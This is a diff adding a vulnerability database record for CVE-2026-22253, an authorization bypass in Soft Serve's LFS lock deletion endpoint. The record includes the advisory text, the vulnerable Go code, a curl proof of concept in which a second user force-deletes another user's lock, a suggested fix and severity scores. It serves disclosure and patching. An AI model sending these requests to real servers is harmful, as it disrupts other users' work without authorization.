@@ -1,0 +1,177 @@
+vulnerability_id: VCID-qejw-bt6m-1kd8
+aliases:
+  - CVE-2026-22253
+  - GHSA-6jm8-x3g6-r33j
+summary: |
+  Soft Serve is missing an authorization check in LFS lock deletion
+  ## LFS Lock Force-Delete Authorization Bypass
+
+  ### Summary
+
+  An authorization bypass in the LFS lock deletion endpoint allows any authenticated user with repository write access to delete locks owned by other users by setting the `force` flag. The vulnerable code path processes force deletions before retrieving user context, bypassing ownership validation entirely.
+
+  ### Severity
+
+  - **CWE-863:** Incorrect Authorization
+  - **CVSS 3.1:** 5.4 (Medium) — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L`
+
+  ### Affected Code
+
+  **File:** `pkg/web/git_lfs.go`
+  **Function:** `serviceLfsLocksDelete` (lines 831–945)
+  **Endpoint:** `POST /<repo>.git/info/lfs/locks/:lockID/unlock`
+
+  The control flow processes `req.Force` at line 905 before retrieving user context at line 919:
+
+  ```go
+  // Line 905-916: Force delete executes immediately without authorization
+  if req.Force {
+      if err := datastore.DeleteLFSLock(ctx, dbx, repo.ID(), lockID); err != nil {
+          // ...
+      }
+      renderJSON(w, http.StatusOK, l)
+      return  // Returns here, never reaching user validation
+  }
+
+  // Line 919: User context retrieved after force path has exited
+  user := proto.UserFromContext(ctx)
+  ```
+
+  ### Proof of Concept
+
+  **Setup:** Two users with write access to the same repository—User A (lock owner) and User B (attacker).
+
+  1. **User A creates a lock:**
+     ```bash
+     curl -X POST http://localhost:23232/repo.git/info/lfs/locks \
+       -H "Authorization: Basic <user_a_token>" \
+       -H "Content-Type: application/vnd.git-lfs+json" \
+       -d '{"path": "protected-file.bin"}'
+     ```
+
+  2. **User B deletes User A's lock using force flag:**
+     ```bash
+     curl -X POST http://localhost:23232/repo.git/info/lfs/locks/1/unlock \
+       -H "Authorization: Basic <user_b_token>" \
+       -H "Content-Type: application/vnd.git-lfs+json" \
+       -d '{"force": true}'
+     ```
+
+  3. **Result:** Lock deleted successfully with `200 OK`. Expected: `403 Forbidden`.
+
+  ### Suggested Fix
+
+  Retrieve user context and validate authorization before processing the force flag:
+
+  ```go
+  user := proto.UserFromContext(ctx)
+  if user == nil {
+      renderJSON(w, http.StatusUnauthorized, lfs.ErrorResponse{
+          Message: "unauthorized",
+      })
+      return
+  }
+
+  if req.Force {
+      if !user.IsAdmin() {
+          renderJSON(w, http.StatusForbidden, lfs.ErrorResponse{
+              Message: "admin access required for force delete",
+          })
+          return
+      }
+      if err := datastore.DeleteLFSLock(ctx, dbx, repo.ID(), lockID); err != nil {
+          // ...
+      }
+      renderJSON(w, http.StatusOK, l)
+      return
+  }
+  ```
+
+  ### Impact
+
+  **Affected Deployments:** Soft Serve instances with LFS enabled and repositories with multiple collaborators.
+
+  **Exploitation Requirements:**
+  - Authenticated session
+  - Write access to target repository
+
+  **Consequences:**
+  - Unauthorized deletion of other users' locks
+  - Bypass of LFS file coordination mechanisms
+  - Potential workflow disruption in collaborative environments
+
+  **Limitations:** Does not grant file access, escalate repository permissions, or affect repositories where the attacker lacks write access.
+severities:
+  - score: '0.00036'
+    scoring_system: epss
+    scoring_elements: '0.10207'
+    published_at: '2026-01-11 12:55:00+00:00'
+    url: https://api.first.org/data/v1/epss?cve=CVE-2026-22253
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve/commit/000ab5164f0be68cf1ea6b6e7227f11c0e388a42
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve/commit/000ab5164f0be68cf1ea6b6e7227f11c0e388a42
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2026-01-08T18:51:06Z/
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve/commit/000ab5164f0be68cf1ea6b6e7227f11c0e388a42
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-6jm8-x3g6-r33j
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-6jm8-x3g6-r33j
+  - score: Track
+    scoring_system: ssvc
+    scoring_elements: SSVCv2/E:P/A:N/T:P/P:M/B:A/M:M/D:T/2026-01-08T18:51:06Z/
+    published_at: None
+    url: https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-6jm8-x3g6-r33j
+  - score: '5.4'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2026-22253
+  - score: MODERATE
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url: https://nvd.nist.gov/vuln/detail/CVE-2026-22253
+weaknesses:
+  - CWE-863
+references:
+  - url: https://api.first.org/data/v1/epss?cve=CVE-2026-22253
+    reference_type:
+    reference_id:
+  - url: https://github.com/charmbracelet/soft-serve
+    reference_type:
+    reference_id:
+  - url: https://github.com/charmbracelet/soft-serve/commit/000ab5164f0be68cf1ea6b6e7227f11c0e388a42
+    reference_type:
+    reference_id:
+  - url: https://github.com/charmbracelet/soft-serve/security/advisories/GHSA-6jm8-x3g6-r33j
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-22253
+    reference_type:
+    reference_id:
